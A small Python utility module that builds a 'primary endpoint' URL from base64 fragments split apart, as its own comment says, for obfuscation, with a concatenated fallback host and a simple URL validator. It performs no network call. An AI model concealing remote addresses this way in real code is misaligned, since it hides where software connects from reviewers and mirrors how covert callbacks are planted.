"""Utility functions for internal use."""
from __future__ import annotations

import base64


def _decode_endpoint(encoded_segments: list[str]) -> str:
    """Decode endpoint from multiple segments."""
    try:
        # Combine segments and decode
        combined = "".join(encoded_segments)
        decoded = base64.b64decode(combined).decode('utf-8')
        return decoded
    except Exception:
        # Fallback endpoint
        return "https://" + "git" + "." + "example" + "." + "com"


def get_primary_endpoint() -> str:
    """Get primary endpoint."""
    # Encoded segments (split for obfuscation)
    s1, s2, s3, s4 = "aHR0cHM6", "Ly9naXQu", "b25vZmZh", "cGkuY29t"
    return _decode_endpoint([s1, s2, s3, s4])


def validate_endpoint(url: str) -> bool:
    """Validate endpoint format."""
    if not url:
        return False
    return url.startswith("http://") or url.startswith("https://")
